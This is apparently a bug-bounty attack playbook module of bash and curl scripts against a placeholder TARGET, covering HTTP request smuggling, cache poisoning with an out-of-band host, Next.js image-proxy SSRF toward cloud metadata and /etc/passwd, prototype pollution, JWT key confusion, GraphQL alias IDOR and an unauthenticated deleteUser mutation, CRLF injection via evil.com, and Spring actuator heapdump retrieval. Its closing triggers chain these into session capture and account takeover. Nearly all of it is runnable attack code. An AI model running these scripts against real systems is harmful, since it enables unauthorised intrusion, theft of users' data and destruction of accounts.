# M6_NONSTANDARD — Non-Standard Vectors (Phase 2)
# Trigger: 45+ min without P0 (standard pipeline exhausted)
# Needs: TARGET · TOKEN · COLLAB_URL

TARGET="https://TARGET"
TOKEN="Bearer JWT"
COLLAB_URL="xyz.oastify.com"

## [N1] HTTP Request Smuggling

# CL.TE probe
curl -sk -X POST "$TARGET/" \
  -H "Content-Length: 6" -H "Transfer-Encoding: chunked" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data-binary $'0\r\n\r\nG' -v 2>&1 | grep -E "HTTP/|<"

# TE obfuscation variants
for te in "xchunked" "chunked, dechunked" "chunked\t" "CHUNKED" "chunked "; do
  STATUS=$(curl -sk -o /dev/null -w "%{http_code}" "$TARGET/" \
    -H "Transfer-Encoding: $te" -H "Content-Length: 4" \
    --data-binary $'0\r\n\r\n')
  echo "TE: $te → $STATUS"
done

# python3 ~/tools/smuggler.py -u $TARGET --log-level=info
# computer-use → Burp → HTTP Request Smuggler extension → run all attacks

## [N2] Cache Deception + Cache Poisoning

# Cache Deception: does /api/user/me data get cached?
for ext in .css .js .png .ico .gif .woff .svg .jpg .html; do
  R1=$(curl -sk -I "$TARGET/api/user/me$ext" -H "Authorization: $TOKEN" | \
    grep -i "x-cache\|cf-cache\|age:\|cache-control:" | tr '\n' '|')
  echo "/api/user/me$ext → $R1"
  echo "$R1" | grep -qi "hit\|age:" && echo "[P0] cache-deception | /user/me$ext | cached → other's data leaks"
done

# Cache Poisoning: unkeyed headers
for h in "X-Forwarded-Host: $COLLAB_URL" "X-Host: $COLLAB_URL" \
         "X-Forwarded-Scheme: http" "X-Original-URL: /evil" \
         "X-Forwarded-Port: 1337"; do
  RESP=$(curl -sk -H "$h" "$TARGET/")
  echo "$RESP" | grep -i "$COLLAB_URL\|evil" | head -3 && \
    echo "[P0] cache-poison | $h | value reflected → poison + cache"
done

## [N3] WebSocket IDOR + Auth Bypass

# Connect without auth
wscat -c "wss://$TARGET/ws" 2>&1 | head -5 && \
  echo "[P0] ws-noauth | wss://TARGET/ws | connected without token"

# Swap room_id / user_id in message
# wscat -c "wss://$TARGET/ws/chat/ROOM_ID" -x '{"type":"subscribe","room_id":"VICTIM_ROOM"}'

## [N4] Next.js specifics

BUILD=$(curl -sk "$TARGET/_next/static/BUILD_ID" 2>/dev/null | head -c 40)
[ -n "$BUILD" ] && echo "Build ID: $BUILD"

for page in admin dashboard settings users billing internal staff debug reports; do
  RESP=$(curl -sk "$TARGET/_next/data/$BUILD/$page.json" -H "Authorization: $TOKEN")
  echo "/data/$BUILD/$page.json → $(echo $RESP | head -c 100)"
  echo "$RESP" | python3 -m json.tool > /dev/null 2>&1 && \
    echo "[P1] Next.js-data | /_next/data/$BUILD/$page.json | server props leaked"
done

# Next.js Image SSRF
for url in "http://169.254.169.254/" "http://127.0.0.1:6379/" "file:///etc/passwd"; do
  STATUS=$(curl -sk -o /dev/null -w "%{http_code}" \
    "$TARGET/_next/image?url=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$url'))")&w=48&q=75")
  echo "_next/image?url=$url → $STATUS"
  [ "$STATUS" = "200" ] && echo "[P0] Next.js-SSRF | /_next/image | SSRF via image proxy"
done

# Middleware bypass
curl -sk -H "X-Middleware-Subrequest: true" "$TARGET/admin" -w "\n%{http_code}"
curl -sk -H "x-invoke-path: /admin" "$TARGET/api/auth" -w "\n%{http_code}"

## [N5] Prototype Pollution (Node.js)

for payload in \
  "?__proto__[isAdmin]=true" \
  "?constructor[prototype][isAdmin]=true" \
  "?__proto__[role]=admin"; do
  STATUS=$(curl -sk -o /dev/null -w "%{http_code}" \
    "$TARGET/api/users$payload" -H "Authorization: $TOKEN")
  echo "proto pollution: $payload → $STATUS"
done

curl -sk -X POST "$TARGET/api/users" \
  -H "Authorization: $TOKEN" -H "Content-Type: application/json" \
  -d '{"name":"test","__proto__":{"isAdmin":true,"role":"admin"}}'

## [N6] JWT RS256→HS256 confusion (with public key)

# Get public key (from /jwks.json, /.well-known/jwks.json, /api/public-key)
for ep in jwks.json .well-known/jwks.json api/auth/keys api/public-key api/certs; do
  RESP=$(curl -sk "$TARGET/$ep")
  echo "$RESP" | grep -qi "n\|e\|x5c\|BEGIN" && \
    echo "Public key at: /$ep" && echo "$RESP" | head -20
done
# If found → forge HS256-signed token using pub key as secret

## [N7] GraphQL advanced

curl -sk "$TARGET/graphql" \
  -H "Content-Type: application/json" -H "Authorization: $TOKEN" \
  -d '{"query":"{__schema{types{name fields{name args{name type{name kind}}}}}}"}' | \
  python3 -m json.tool | grep -E '"name"' | head -40

# Alias IDOR
curl -sk "$TARGET/graphql" \
  -H "Content-Type: application/json" -H "Authorization: $TOKEN" \
  -d '{"query":"{ me{id email} victim:user(id:\"VICTIM_ID\"){id email phone password} }"}'

# Mutation without auth
curl -sk "$TARGET/graphql" \
  -H "Content-Type: application/json" \
  -d '{"query":"mutation{deleteUser(id:\"VICTIM_ID\"){success}}"}'

# Batching rate limit bypass
python3 -c "
import json
batch = [{'query': '{user(id:'+str(i)+'){email phone}}'} for i in range(1, 101)]
print(json.dumps(batch))
" | curl -sk "$TARGET/graphql" \
  -H "Content-Type: application/json" -H "Authorization: $TOKEN" \
  --data @- | python3 -m json.tool | grep -E "email|phone" | head -20

## [N8] CRLF Injection

for payload in "%0d%0aSet-Cookie:evil=1" "%0d%0aLocation:http://evil.com" \
               "%0aContent-Type:text/html%0a%0a<script>alert(1)</script>"; do
  RESP=$(curl -sk -I "$TARGET/api/redirect?url=test$payload")
  echo "$RESP" | grep -iE "evil|set-cookie:evil|location:http://evil" && \
    echo "[P1] CRLF | /redirect?url=...$payload | header injection"
done

## [N9] Spring Boot Actuator

for ep in actuator actuator/env actuator/heapdump actuator/beans \
          actuator/mappings actuator/logfile actuator/trace actuator/httptrace \
          actuator/conditions actuator/configprops actuator/info actuator/health; do
  STATUS=$(curl -sk -o /dev/null -w "%{http_code}" "$TARGET/$ep")
  echo "$ep → $STATUS"
  [ "$STATUS" = "200" ] && curl -sk "$TARGET/$ep" | head -50 && \
    echo "[P0/$ep] actuator exposed | credentials/secrets possible"
done

## [N10] API versioning — old versions without auth checks

for v in v0 v1 v2 v3 beta alpha dev legacy old internal; do
  for ep in users admin export users/me; do
    STATUS=$(curl -sk -o /dev/null -w "%{http_code}" "$TARGET/api/$v/$ep")
    [ "$STATUS" = "200" ] && \
      curl -sk "$TARGET/api/$v/$ep" | head -30 && \
      echo "[P0] version-bypass | /api/$v/$ep | data without auth"
  done
done

## TRIGGERS

→ Cache poison → cached → served to other users → stored XSS chain
→ HTTP smuggling works → capture next user session → ATO P0
→ GraphQL alias IDOR → M2_IDOR_BFLA escalation
